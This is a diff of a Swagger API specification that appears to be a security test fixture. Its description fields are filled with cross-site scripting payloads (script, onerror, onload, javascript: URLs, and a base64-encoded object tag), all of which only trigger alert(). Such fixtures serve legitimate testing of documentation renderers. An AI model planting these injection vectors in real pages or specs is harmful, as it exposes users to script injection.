@@ -1,31 +1,39 @@
 swagger: '2.0'
 info:
-  title: Vulnerable API Documentation
+  title: XSS Test API - Security Assessment
   description: |
-    <script>alert('XSS Demo - Security Test')</script>
-    <img src=x onerror=alert('XSS-Triggered')>
+    <script>alert("XSS in API Description")</script>
+    <img src=x onerror=alert("onerror-XSS")>
+    <svg/onload=alert("SVG-XSS")>
   version: 1.0.0
-host: vulnerable.example.com
+host: test.example.com
 basePath: /v1
 schemes:
   - http
 produces:
   - application/json
+consumes:
+  - application/json
 paths:
-  /test/{input}:
+  /xss-test/{input}:
     get:
+      tags:
+        - XSS-Test
+      summary: XSS Test Endpoint
+      description: |
+        <iframe src="javascript:alert('XSS in Endpoint Description')"></iframe>
       parameters:
         - name: input
           in: path
           description: |
-            <svg/onload=alert('XSS-Param')>
-            <img src=1 onerror=alert(1)>
+            <img src=1 onerror=alert("XSS in Parameter Desc")>
+            <math><maction actiontype="statusline#http://example.com" xlink:href="javascript:alert('Maction-XSS')"></math>
           required: true
           type: string
       responses:
         '200':
           description: |
-            <iframe/src="javascript:alert('XSS-Response')">
+            <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnT2JqZWN0LVhTUycpOzwvc2NyaXB0Pg=="></object>
 securityDefinitions:
   basicAuth:
     type: basic
